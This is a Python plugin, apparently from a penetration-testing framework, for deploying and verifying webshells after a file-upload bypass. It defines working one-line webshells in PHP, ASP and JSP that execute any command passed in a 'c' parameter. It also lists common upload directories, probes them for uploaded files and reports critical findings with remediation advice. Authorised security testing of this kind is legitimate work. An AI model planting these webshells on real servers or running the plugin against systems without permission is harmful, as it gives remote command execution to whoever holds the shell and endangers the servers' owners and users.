"""Webshell deployment â€” deploy + verify webshell via upload/LFI/RCE."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.http import resolve_base_urls

logger = logging.getLogger(__name__)

# Minimal webshell templates
WEBSHELLS = {
    "php": '<?php echo "{marker}"; if(isset($_GET["c"])){{system($_GET["c"]);}} ?>',
    "asp": '<%response.write("{marker}")%><%execute(request("c"))%>',
    "jsp": (
        '<%@ page import="java.io.*" %><% out.println("{marker}"); '
        'if(request.getParameter("c")!=null){{Process p=Runtime.getRuntime()'
        '.exec(request.getParameter("c"));}} %>'
    ),
}

# Common upload directories to check for deployed shells
UPLOAD_DIRS = [
    "/uploads/", "/upload/", "/files/", "/media/", "/images/",
    "/tmp/", "/temp/", "/attachments/", "/assets/", "/static/",
    "/content/", "/data/", "/wp-content/uploads/",
]


class WebshellDeployPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="webshell_deploy",
        display_name="Webshell Deploy & Verify",
        category=PluginCategory.EXPLOITATION,
        description="Deploy and verify webshell via upload bypass or LFI",
        depends_on=["file_upload_bypass"],
        produces=["shell_session"],
        timeout=60.0,
        risk_level="destructive",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        findings: list[Finding] = []
        data: dict = {"deployed": False}

        # Check if file_upload_bypass found any working bypasses
        upload_result = ctx.pipeline.get(f"file_upload_bypass:{target.host}")
        if not upload_result or not upload_result.ok:
            findings.append(Finding.info(
                "No upload bypass available for webshell deployment",
                tags=["webshell"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        bypasses = upload_result.data.get("bypasses", [])
        if not bypasses:
            findings.append(Finding.info(
                "No confirmed upload bypasses to exploit",
                tags=["webshell"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        base_urls = await resolve_base_urls(target, ctx)
        base_url = base_urls[0] if base_urls else f"https://{target.host}"

        # Try to verify if any uploaded file is accessible
        for bypass in bypasses:
            if ctx.should_stop:
                break
            filename = bypass.get("filename", "")
            for upload_dir in UPLOAD_DIRS[:10]:
                check_url = f"{base_url}{upload_dir}{filename}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(check_url, timeout=5.0)
                        if resp.status == 200:
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )
                            if "UPLOAD_TEST_OK" in body:
                                data["deployed"] = True
                                data["webshell_url"] = check_url
                                findings.append(Finding.critical(
                                    f"Webshell accessible: {check_url}",
                                    evidence=f"URL: {check_url}\nResponse: {body[:200]}",
                                    description="Uploaded file is executable as a webshell",
                                    remediation=(
                                        "Remove uploaded files, fix upload validation, "
                                        "disable script execution in upload directories"
                                    ),
                                    tags=["webshell", "rce"],
                                ))
                                return PluginResult.success(
                                    self.meta.name, target.host,
                                    findings=findings, data=data,
                                )
                except Exception:
                    continue

        findings.append(Finding.info(
            "Upload bypass confirmed but webshell not accessible",
            description="File uploaded but execution path not found",
            tags=["webshell"],
        ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
